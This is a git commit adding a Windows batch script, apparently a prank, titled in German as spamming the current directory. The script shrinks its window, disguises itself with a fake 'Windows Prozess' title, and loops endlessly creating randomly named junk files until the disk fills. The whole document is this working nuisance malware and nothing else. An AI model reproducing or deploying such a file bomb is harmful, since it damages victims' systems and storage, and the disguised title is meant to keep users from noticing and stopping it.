597ed4de007a09aa12b7e92e6d2e792b6dbe2b36
lost21k <74735380+lost21k@users.noreply.github.com>
2020-11-19 20:54:17 +0100

    Create aktuelles verzeichniss spammen.bat

---
+++ batch/aktuelles verzeichniss spammen.bat
@@ -0,0 +1,33 @@
+@echo off
+mode con cols=14 lines=1
+color 01
+title Windows Prozess 56124
+:a
+echo %random%%random%%random%%random% >> %random%%random%%random%%random%
+echo %random%%random%%random%%random% >> a%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> b%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> c%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> d%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> e%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> f%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> g%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> h%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> i%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> j%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> k%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> l%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> m%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> n%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> o%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> p%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> q%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> r%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> s%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> t%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> u%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> v%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> w%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> x%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> y%random%%random%%random%%random%
+echo %random%%random%%random%%random% >> z%random%%random%%random%%random%
+goto a
